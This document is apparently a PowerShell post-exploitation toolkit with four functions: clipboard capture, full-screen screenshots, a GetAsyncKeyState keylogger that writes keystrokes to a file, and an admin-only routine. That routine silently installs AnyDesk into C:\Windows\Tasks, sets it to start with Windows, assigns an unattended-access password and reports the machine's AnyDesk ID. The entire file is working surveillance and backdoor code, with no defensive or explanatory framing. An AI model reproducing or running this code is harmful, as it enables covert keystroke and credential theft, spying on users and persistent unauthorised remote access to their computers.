function Invoke-Clipboard {

    try {
        Get-Clipboard -Raw
    }
    catch {
    
        Write-Output "Error something went wrong"
    }
    
}

function Invoke-Screenshot {

    Param(
        [Parameter(Mandatory = $true)][string]$Path
    )

    try {
        $FileName = "$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png"
        $File = Join-Path $Path $FileName
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing

        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width
        $Height = $Screen.Height
        $Left = $Screen.Left
        $Top = $Screen.Top

        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

        $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)
        Write-Output "Screenshot saved to: $File"
    }
    catch {
        Write-Error "Failed to save screenshot. Error: $_"
    }
    finally {
        
        if ($graphic) { $graphic.Dispose() }
        if ($bitmap) { $bitmap.Dispose() }
    }
}

function Invoke-KeyStrokeCapture {

    param(
        [Parameter(Mandatory = $true)][int]$DurationInSeconds,
        [Parameter(Mandatory = $true)][string]$OutputPath
    )

    $signatures = @"
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
"@
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    $null = New-Item -Path $OutputPath -ItemType File -Force


    $endTime = (Get-Date).AddSeconds($DurationInSeconds)


    $keyCodes = @{
        8 = "`b"        # Backspace
        13 = "`r`n"     # Enter
        32 = " "        # Space
        9 = "`t"        # Tab
        46 = "DEL"      # Delete
    }

    $shiftKeyMapping = @{
        48 = ")" # Shift + 0
        49 = "!" # Shift + 1
        50 = "@" # Shift + 2
        51 = "#" # Shift + 3
        52 = "$" # Shift + 4
        53 = "%" # Shift + 5
        54 = "^" # Shift + 6
        55 = "&" # Shift + 7
        56 = "*" # Shift + 8
        57 = "(" # Shift + 9
    }

    $nonPrintableKeys = @{
        27 = "ESC" # Escape
        33 = "PGUP" # Page Up
        34 = "PGDN" # Page Down
        35 = "END" # End
        36 = "HOME" # Home
        37 = "LEFT" # Left Arrow
        38 = "UP" # Up Arrow
        39 = "RIGHT" # Right Arrow
        40 = "DOWN" # Down Arrow
    }


    $previousState = @{}
    $modifiers = @{
        16 = $false # Left Shift
        160 = $false # Right Shift
        17 = $false # Ctrl
        18 = $false # Alt
    }


    function Get-Character {
        param (
            [int]$keyCode
        )


        if ($modifiers[16] -or $modifiers[160]) {
            if ($shiftKeyMapping.ContainsKey($keyCode)) {
                return $shiftKeyMapping[$keyCode]
            }
        }


        if ($keyCode -ge 32 -and $keyCode -le 126) {
            return [char]$keyCode
        }


        if ($nonPrintableKeys.ContainsKey($keyCode)) {
            return $nonPrintableKeys[$keyCode]
        }

        return "`n" 
    }

    while ((Get-Date) -lt $endTime) {
        Start-Sleep -Milliseconds 50

        for ($keyCode = 8; $keyCode -le 255; $keyCode++) {
            $keyState = $API::GetAsyncKeyState($keyCode)
            $isPressed = ($keyState -band 0x8000) -ne 0

            if ($keyCode -eq 16 -or $keyCode -eq 160) {

                $modifiers[$keyCode] = $isPressed
            } elseif ($keyCode -eq 17 -or $keyCode -eq 18) {

                $modifiers[$keyCode] = $isPressed
            } elseif ($isPressed -and (-not $previousState[$keyCode])) {
 
                [System.IO.File]::AppendAllText($OutputPath, (Get-Character -keyCode $keyCode), [System.Text.Encoding]::ASCII)

                $previousState[$keyCode] = $true
            } elseif (-not $isPressed) {

                if ($previousState.ContainsKey($keyCode)) {
                    $previousState.Remove($keyCode)
                }
            }
        }
    }

    Write-Host "Keystroke logging completed. Output saved to $OutputPath"
}

function Invoke-AnyDeskInstall {
    param (
        [Parameter(Mandatory = $true)]
        [string]$InstallPath,

        [Parameter(Mandatory = $true)]
        [string]$Password,

        [string]$AnyDeskURL = "https://download.anydesk.com/AnyDesk.exe",
        [string]$DestinationPath = "C:\Windows\Tasks\AnyDesk.exe"
    )

    function Test-AdminAccess {
        $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentIdentity)
        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    function Download-And-Install-AnyDesk {

        New-Item -ItemType Directory -Path (Split-Path -Parent $DestinationPath) -Force -ErrorAction SilentlyContinue

        Write-Output "Downloading AnyDesk from $AnyDeskURL to $DestinationPath"
        Start-BitsTransfer -Source $AnyDeskURL -Destination $DestinationPath

        New-Item -ItemType Directory -Path $InstallPath -Force -ErrorAction SilentlyContinue

        try {
            Write-Output "Installing AnyDesk to $InstallPath"
            Start-Process -FilePath $DestinationPath -ArgumentList "--install `"$InstallPath`" --start-with-win --silent" -Wait
        } 
        catch {
            Write-Output "Error Occurred! Could not install AnyDesk to $InstallPath."
        }

        Start-Sleep -Seconds 5

        try {
            Remove-Item $DestinationPath -Force
        } catch {
            Write-Output "Failed to remove file: $_"
        }
    }

    function Find-AnyDeskPath {
        $possiblePaths = @(
            "C:\Program Files\AnyDesk\AnyDesk.exe",
            "C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
            "$InstallPath\AnyDesk.exe"
        )

        foreach ($path in $possiblePaths) {
            if (Test-Path $path) {
                return $path
            }
        }

        return $null
    }

    function Setup-UnattendedAccess {
        $anyDeskPath = Find-AnyDeskPath
        if ($anyDeskPath) {
            Write-Output "Setting password..."
            Start-Process -FilePath $anyDeskPath -ArgumentList "--set-password $Password" -Wait

            $stdoutPath = "C:\Windows\Tasks\id.txt"
            Write-Output "Getting AnyDesk ID..."
            Start-Process -FilePath $anyDeskPath -ArgumentList "--get-id" -RedirectStandardOutput $stdoutPath -NoNewWindow -Wait
            
            if (Test-Path $stdoutPath) {
                $id = Get-Content $stdoutPath
                Write-Output "AnyDesk ID is: $id"
                Remove-Item $stdoutPath -ErrorAction SilentlyContinue
            } else {
                Write-Output "Failed to retrieve AnyDesk ID. Output file not found."
            }
        } else {
            Write-Output "AnyDesk executable not found. Unattended access setup aborted."
        }
    }

    function Check-AnyDeskInstallation {
        $anydesk = Get-Package -Name AnyDesk -ErrorAction SilentlyContinue
        if ($anydesk) {
            Write-Output "AnyDesk is already installed. Version: $($anydesk.Version)"
        } else {
            Write-Output "AnyDesk is not installed. Installing now..."
            Download-And-Install-AnyDesk
        }

        Setup-UnattendedAccess
    }

    if (-not (Test-AdminAccess)) {
        Write-Output "This function requires Administrative access."
        return
    }

    Check-AnyDeskInstallation
}












 


 